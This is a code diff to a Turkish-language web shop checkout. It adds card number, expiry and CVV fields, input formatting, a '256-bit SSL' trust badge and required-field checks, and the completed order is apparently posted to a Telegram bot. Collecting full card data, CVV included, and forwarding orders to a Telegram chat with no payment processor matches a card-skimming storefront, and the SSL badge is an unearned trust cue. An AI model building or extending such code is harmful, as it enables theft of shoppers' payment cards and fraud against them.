@@ -109,11 +109,25 @@ function openCheckout() {
   panelTitle.innerText = "Güvenli Ödeme";
 
   panelContent.innerHTML = `
-    <label>Kart Üzerindeki İsim</label>
+    <label>Ad Soyad</label>
     <input id="name" placeholder="Ad Soyad">
 
     <label>Telefon</label>
-    <input id="phone" placeholder="05xx xxx xx xx">
+    <input id="phone" placeholder="05xx xxx xx xx" inputmode="numeric">
+
+    <label>Kart Numarası</label>
+    <input id="card" placeholder="1234 5678 9012 3456" inputmode="numeric">
+
+    <div style="display:flex;gap:10px;">
+      <div style="flex:1;">
+        <label>SKT</label>
+        <input id="exp" placeholder="MM/YY" inputmode="numeric">
+      </div>
+      <div style="flex:1;">
+        <label>CVV</label>
+        <input id="cvv" placeholder="123" inputmode="numeric">
+      </div>
+    </div>
 
     <label>Adres</label>
     <textarea id="address" placeholder="Teslimat adresi"></textarea>
@@ -121,6 +135,10 @@ function openCheckout() {
     <p style="margin-top:10px;">
       <strong>Toplam: ${total} TL</strong>
     </p>
+
+    <small style="color:#666;">
+      🔒 256-bit SSL ile korunmaktadır
+    </small>
   `;
 
   panelFooter.innerHTML = `
@@ -130,7 +148,38 @@ function openCheckout() {
   cartPanel.classList.add('active');
 }
 
-// ================== TELEGRAM MESAJ ==================
+// ================== INPUT FORMATLAMA ==================
+document.addEventListener("input", function (e) {
+
+  // Telefon
+  if (e.target.id === "phone") {
+    let v = e.target.value.replace(/\D/g, "").substring(0, 10);
+    let f = v;
+    if (v.length > 3) f = v.slice(0,3) + " " + v.slice(3);
+    if (v.length > 6) f = v.slice(0,3) + " " + v.slice(3,6) + " " + v.slice(6);
+    if (v.length > 8) f = v.slice(0,3) + " " + v.slice(3,6) + " " + v.slice(6,8) + " " + v.slice(8);
+    e.target.value = f;
+  }
+
+  // Kart
+  if (e.target.id === "card") {
+    let v = e.target.value.replace(/\D/g, "").substring(0, 16);
+    e.target.value = v.match(/.{1,4}/g)?.join(" ") || "";
+  }
+
+  // SKT
+  if (e.target.id === "exp") {
+    let v = e.target.value.replace(/\D/g, "").substring(0, 4);
+    e.target.value = v.length > 2 ? v.slice(0,2) + "/" + v.slice(2) : v;
+  }
+
+  // CVV
+  if (e.target.id === "cvv") {
+    e.target.value = e.target.value.replace(/\D/g, "").substring(0, 3);
+  }
+});
+
+// ================== TELEGRAM ==================
 function sendTelegramMessage(message) {
   fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
     method: "POST",
@@ -144,9 +193,17 @@ function sendTelegramMessage(message) {
 
 // ================== SİPARİŞ TAMAMLAMA ==================
 function completeOrder() {
-  const name = document.getElementById("name").value || "-";
-  const phone = document.getElementById("phone").value || "-";
-  const address = document.getElementById("address").value || "-";
+  const name    = document.getElementById("name").value.trim();
+  const phone   = document.getElementById("phone").value.trim();
+  const card    = document.getElementById("card").value.trim();
+  const exp     = document.getElementById("exp").value.trim();
+  const cvv     = document.getElementById("cvv").value.trim();
+  const address = document.getElementById("address").value.trim();
+
+  if (!name || !phone || !card || !exp || !cvv || !address) {
+    alert("Lütfen tüm alanları eksiksiz doldurun!");
+    return;
+  }
 
   const total = cart.qty * cart.price;
 
@@ -164,7 +221,7 @@ Toplam: ${total} TL
 
   sendTelegramMessage(message);
 
-  alert("Siparişiniz alındı ❤️");
+  alert("Siparişiniz başarıyla alındı ❤️");
   cart.qty = 0;
   cartPanel.classList.remove('active');
 }
